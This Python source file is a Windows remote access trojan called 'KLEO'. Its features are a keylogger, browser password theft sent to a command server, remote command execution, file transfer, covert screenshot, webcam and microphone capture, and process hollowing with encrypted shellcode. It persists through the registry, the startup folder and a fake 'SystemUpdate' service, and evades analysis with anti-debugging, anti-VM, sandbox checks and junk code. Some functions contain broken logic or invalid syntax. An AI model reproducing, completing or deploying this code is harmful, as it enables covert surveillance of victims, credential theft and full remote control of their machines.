import socket
import os
import sys
import subprocess
import time
import ssl
import ctypes
import winreg
import base64
import random
import string
import zlib
import marshal
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import cv2
import pyaudio
import shutil
import logging
from KLEO_psswd import extract_firefox_passwords, extract_chromium_based_passwords, save_and_send
from KLEO_stealth import process_hollow

# Setup logging
logging.basicConfig(filename='KLEO.log',
                    level=logging.INFO, format='%(asctime)s - %(message)s')

# Generate a random key for encoding/decoding
def generate_key(length=16):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

KEY = generate_key()

def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))

# Encode string with multiple layer of obfuscation
def multi_layer_encode(data):
    encoded = base64.b64encode(data.encode()).decode()
    encoded = zlib.compress(encoded.encode()).decode('latin1')
    encoded = base64.b64decode(encoded.encode('latin1')).decode()
    encoded = xor_encrypt_decrypt(encoded, KEY)
    return encoded

# Decode a string with several layers of obfuscation
def multi_layer_decode(encoded):
    decoded = xor_encrypt_decrypt(encoded, KEY)
    decoded = base64.b64decode(decoded.encode()).decode('latin1')
    decoded = zlib.compress(decoded.encode('latin1')).decode()
    decoded = base64.b64decode(decoded.encode()).decode()
    return decoded

SERVER_HOST = multi_layer_encode('server_ip')   # Replace with real hosting server IP
SERVER_PORT = multi_layer_encode('9999')
USE_SSL = multi_layer_encode('True')
CERTFILE = multi_layer_encode('None')

# Killswitch
def get_decoded_value(encoded):
    return multi_layer_decode(encoded)

# Function to hide the console window (Windows)
def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Function to add persistence to the system startup (Windows)
def add_persistence():
    if os.name == 'nt':
        exe_path = os.path.realpath(sys.argv[0])
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)

def add_to_startup(file_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shutil.copy(file_path, startup_folder)

def install_service(service_name, exe_path):
    try:
        quoted_path = f'"{exe_path}"'
        # Command to install the service
        command = f'sc create {service_name} binPath= {quoted_path} start= auto'
        result = os.system(command)
        if result == 0:
            print(f"Service {service_name} installed successfully.")
        else:
            print(f"Failed to install service with exit code {result}.")
    except Exception as e:
        print(f"Failed to install service: {e}")

# Anti-Debugging Techniques
def anti_debugging():
    debugger_found = False
    # Check for debuggers using IsDebuggerPresent
    if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
        debugger_found = True
    # Check for common debugging tools
    debugger_tools = ["ollydbg.exe", "wireshark.exe", "fiddler.exe"]
    for tool in debugger_tools:
        if subprocess.call("tasklist | find /i \"" + tool + "\"", shell=True) == 0:
            debugger_found = True
    return debugger_found

# Anti-VM Techniques
def anti_vm():
    vm_signs = ["VBOX", "VMware", "VMWARE", "vbox", "QEMU"]
    vm_found = False
    for sign in vm_signs:
        if subprocess.call("wmic baseboard get product, manufacturer | find /i \"" + sign + "\"", shell=True) == 0:
            vm_found = True
    return vm_found

# Function to check sandbox
def check_sandbox():
    sandbox_artifacts = [
        "C:\\windows\\sysnative\\drivers\\vmmouse.sys",  # VMware mouse driver
        "C:\\windows\\sysnative\\drivers\\vmhgfs.sys",   # VMware shared folders driver
        "C:\\windows\\sysnative\\drivers\\VBoxMouse.sys", # VirtualBox mouse driver
        "C:\\windows\\sysnative\\drivers\\VBoxGuest.sys", # VirtualBox guest additions
        "C:\\windows\\sysnative\\drivers\\VBoxSF.sys",    # VirtualBox shared folder driver
        "C:\\windows\\sysnative\\drivers\\VBoxVideo.sys", # VirtualBox video driver
    ]

    sandbox_found = False
    for artifact in sandbox_artifacts:
        if os.path.exists(artifact):
            sandbox_found = True
            break

    return sandbox_found

# Function to check_timing - checking if system has been running for less than a minute
def timing_analysis():
    uptime = time.time()
    for _ in range(100000):
        pass
    end_time = time.time()
    elapsed_time = end_time - uptime

    return elapsed_time > 1

# Function to run as a background process
def run_background():
    if os.name == 'nt':
        subprocess.Popen([sys.executable] + sys.argv,
                         creationflags=subprocess.CREATE_NO_WINDOW,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE
                        )

# Function to receive files
def receive_file(client, filename):
    with open(filename, 'wb') as f:
        while True:
            bytes_read = client.recv(1024)
            if bytes_read.endswith(b"EOF"):
                f.write(bytes_read[:-3])
                break
            f.write(bytes_read)

# Function to send files
def send_file(client, filename):
    try:
        with open(filename, 'rb') as f:
            while True:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                client.sendall(bytes_read)
        client.send(b"EOF")
    except FileNotFoundError:
        client.send(f"Error: File {filename} not found.".encode())

# Function to execute commands
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}"

# Function to capture a screenshot
def capture_screenshot(filename):
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        return f"Screenshot saved as {filename}"
    except ImportError:
        return "Error: pyautogui module not installed."

# Function to capture webcam images
def capture_webcam(filename):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(filename, frame)
            cap.release()
            return f"Image saved as: {filename}."
        else:
            cap.release()
            return "Error: Could not access webcam."
    except ImportError:
        return "Error: OpenCV module not installed."

# Function to record audio
def record_audio(filename, duration=10):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []

        for _ in range(0, int(44100 / 1024 * duration)):
            frames.append(stream.read(1024))
        stream.stop_stream()
        stream.close()
        p.terminate()
        with open(filename, 'wb') as file:
            file.write(b''.join(frames))
        return f"Audio saved and saved as: {filename}."
    except ImportError:
        return "Error: pyaudio module not installed."
    
# Function to shut down or restart system
def control_system(command):
    try:
        if command == 'shutdown':
            os.system('shutdown /s /t 1')
        elif command == 'restart':
            os.system('shutdown /r /t 1')
        elif command == 'logoff':
            os.system('shutdown /l')
        else:
            return "Error: Invalid system control command."
    except Exception as e:
        return f"Error: {str(e)}"

# Function to handle server commands
def handle_commands(client):
    current_directory = os.getcwd()
    try:
        while True:
            command = client.recv(1024).decode()
            if command.lower() == 'exit':
                break
            elif command.startswith('cd '):
                new_dir = command[3:]
                try:
                    os.chdir(new_dir)
                    current_directory = os.getcwd()
                    response = f"Changed directory to {current_directory}"
                except FileNotFoundError:
                    response = f"Error: Directory {new_dir} not found."
            elif command.startswith('upload '):
                filename = command.split(' ', 1)[1]
                receive_file(client, filename)
                response = f"File: {filename} uploaded successfully."
            elif command.startswith('download '):
                filename = command.split(' ', 1)[1]
                send_file(client, filename)
                response = f"File: {filename} sent successfully."
            elif command.startswith('exec '):
                response = execute_command(command[5:])
            elif command == 'screenshot':
                response = capture_screenshot('screenshot.png')
            elif command == 'webcam':
                response = capture_webcam('webcam_image.jpg')
            elif command.startswith('audio '):
                duration = int(command.split(' ', 1)[1])
                response = record_audio('audio_recording.wav', duration)
            elif command.startswith('system '):
                response = control_system(command[7:])
            elif command == 'send psswd':
                _, browser = command.split()
                if browser.lower() in ["chrome", "edge", "brave", "opera"]:
                    passwords = extract_chromium_based_passwords(browser)
                elif browser.lower() == "firefox":
                    passwords = extract_firefox_passwords()
                else:
                    passwords = "Browser not supported. Password not extracted."
                save_and_send(passwords, client)
                return "Passwords successfully extracted and sent!"
            else:
                response = "Error: Unknown command."
            client.send(response.encode())
    except Exception as e:
        logging.error(f"Command handling error: {e}")
    finally:
        client.close()
        logging.info(f"Connection closed.")

# Function to establish persistent connection
def persistent_connection():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if get_decoded_value(USE_SSL) == 'True':
                context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                if get_decoded_value(CERTFILE) != 'None':
                    context.load_verify_locations(get_decoded_value(CERTFILE))
                client = context.wrap_socket(client, server_hostname=get_decoded_value(SERVER_HOST))
            client.connect((get_decoded_value(SERVER_HOST), int(get_decoded_value(SERVER_PORT))))
            handle_commands(client)
        except Exception as e:
            time.sleep(5)

# Function to create custom bytecode for a function
def create_custom_bytecode(func):
    code = marshal.dumps(func.__code__)
    encoded_code = base64.b64encode(code).decode()
    return encoded_code

def execute_custom_bytecode(encoded_code):
    code = base64.b64decode(encoded_code.encode())
    exec(marshal.loads(code))

# Generaye key for AES encryption
def generate_aes_key():
    return os.urandom(16)

# Encrypt shellcode with AES
def aes_encrypt(shellcode, key):
    cipher = AES.new(key, AES.MODE_CBC)
    padded_data = pad(shellcode, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return base64.b64encode(cipher.iv + encrypted).decode()

def aes_decrypt(encrypted_shellcode, key):
    encrypted_shellcode = base64.b64decode(encrypted_shellcode)
    iv = encrypted_shellcode[:AES.block_size]
    encrypted = encrypted_shellcode[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = cipher.decrypt(encrypted)
    return unpad(padded_data, AES.block_size)

# Variables for payload
PROCESS_HOLLOW_PAYLOAD = (
    b"\x31\xC0\x50\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE2\x50\x52"

    b"\x31\xC0\x50\x68\x6F\x78\x41\x41\x68\x57\x69\x6E\x45\x89\xE1\x50\x51"

    b"\x31\xC0\x50\x31\xDB\xB3\x40\x53\x50\x31\xC0\x50\xFF\xD0"
)
shellcode = PROCESS_HOLLOW_PAYLOAD * 300
shellcode_key = generate_aes_key()

def generate_encrypted_shellcode():
    encrypted_shellcode = aes_encrypt(shellcode, shellcode_key)
    print(f"Shellcode encrypted: {encrypted_shellcode}")
    return encrypted_shellcode

def decrypt_shellcode(encrypted_shellcode):
    decrypted_shellcode = aes_decrypt(encrypted_shellcode, shellcode_key)
    print(f"Shellcode decrypted: {decrypted_shellcode}")
    return decrypted_shellcode

def custom_bytefunc():
    target_exe = "C:\\Windows\\System32\\notepad.exe"
    encrypted_shellcode = generate_encrypted_shellcode()
    payload = decrypt_shellcode(encrypted_shellcode)
    try:
        process_hollow(target_exe, payload)
        logging.info("Successfully executed process hollowing.")
    except Exception as e:
        logging.error(f"Error executing process hollowing: {e}")

# Encode custom function as bytecode
custom_bytecode = create_custom_bytecode(custom_bytefunc)

# Function to inject garbage code
def inject_garbage():
    garbage_code = """
def garbage():
    a = 10
    b = 20
    c = a + b
    d = c * 2
    e = d - a
    return e
"""
    exec(garbage_code)

# Function to inject dead code
def inject_dead_code():
    dead_code = """
def dead():
    if False:
        print("This will never run")
    elif:
        if 1 == 2:
            print("Neither will this")
    elif:
        if 2 == 0:
            print("Error")
    else:
        return 0
"""
    exec(dead_code)

# Keylogger functionality
# Key for encryption/decryption
LOG_KEY = Fernet.generate_key()
cipher_suite = Fernet(LOG_KEY)
# File paths
LOG_FILE = "keylog.txt"
BACKUP_FILE = "keylog_backup.txt"
ENCRYPTED_LOG_FILE = "keylog_encrypted.txt"

def encrypt_log():
    try:
        with open(get_log_file_path(), 'rb') as f:
            data = f.read()
        encrypted_data = cipher_suite.encrypt(data)
        with open(get_encrypted_log_file_path(), 'wb') as f:
            f.write(encrypted_data)
    except Exception as e:
        logging.error(f"Error encrypting log file: {e}")

def backup_log():
    try:
        shutil.copy(get_log_file_path(), get_backup_file_path())
    except Exception as e:
        logging.error(f"Error backing up log file: {e}")

def get_log_file_path():
    return os.path.join(os.getenv('APPDATA', '.'), 'keylog', LOG_FILE)

def get_backup_file_path():
    return os.path.join(os.getenv('APPDATA', '.'), 'keylog', BACKUP_FILE)

def get_encrypted_log_file_path():
    return os.path.join(os.getenv('APPDATA', '.'), 'keylog', ENCRYPTED_LOG_FILE)

def create_directories():
    log_dir = os.path.dirname(get_log_file_path())
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

class AdvancedKeylogger:
    def __init__(self):
        self.keylog = []
        self.running = True

    def on_press(self, key):
        try:
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            self.keylog.append(f"{current_time}: {key.char}")
        except AttributeError:
            self.keylog.append(f"{current_time}: [{key}]")
        self.save_log()

    def on_release(self, key):
        if not self.running:
            return False

    def save_log(self):
        try:
            create_directories()
            with open(get_log_file_path(), 'a') as f:
                for item in self.keylog:
                    f.write(f"{item}\n")
            self.keylog.clear()
        except Exception as e:
            logging.error(f"Error saving log file: {e}")

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def stop(self):
        self.running = False
        self.save_log()
        encrypt_log()

def restart_keylogger():
    try:
        while True:
            if not os.path.exists(get_log_file_path()):
                with open(get_log_file_path(), 'w') as f:
                    pass
            time.sleep(60)
            backup_log()
    except Exception as e:
        logging.error(f"Error in restart_keylogger: {e}")

def start_keylogger():
    keylogger = AdvancedKeylogger()
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.start()

    restart_thread = threading.Thread(target=restart_keylogger)
    restart_thread.start()

    return keylogger

def stop_keylogger(keylogger):
    keylogger.stop()

# Main function to incorporate all stealth techniques
def stealth_main():
    try:
        # init code with some garbaage code injection
        inject_garbage()
        inject_dead_code()
        time.sleep(random.randint(1, 100))

        # Hide console window
        hide_console()

        # Define paths for persistence
        file_path = os.path.abspath(sys.argv[0])
        exe_path = os.path.realpath(sys.argv[0])

        # Install as system service
        time.sleep(random.randint(10, 550))
        install_service("SystemUpdate", exe_path)

        # Add to startup
        time.sleep(random.randint(10, 650))
        add_to_startup(file_path)

        # Ensure persistency in registry
        add_persistence()

        # Anti-debugging, anti-VM, and sandbox detection checks
        if anti_debugging() or anti_vm() or check_sandbox() or timing_analysis():
            logging.info("Debugging environment detected. Exiting...")
            sys.exit()  # Exit if debugging or VM is detected
        # Dealy for avoiding sandbox detection
        time.sleep(random.randint(30, 320))

        # Run as background process
        run_background()

        # Execute encrypted custom bytecode
        execute_custom_bytecode(custom_bytecode)

        # Some more deceptive time
        time.sleep(350)

        # Start keylogger after some time
        keylogger_instance = start_keylogger()

        # Mantain persisten connection
        try:
            persistent_connection()
        finally:
            # Ensure keylogger stops
            stop_keylogger(keylogger_instance)
    except Exception as e:
        logging.error(f"Error in stealth_main: {e}")

if __name__ == '__main__':
    stealth_main()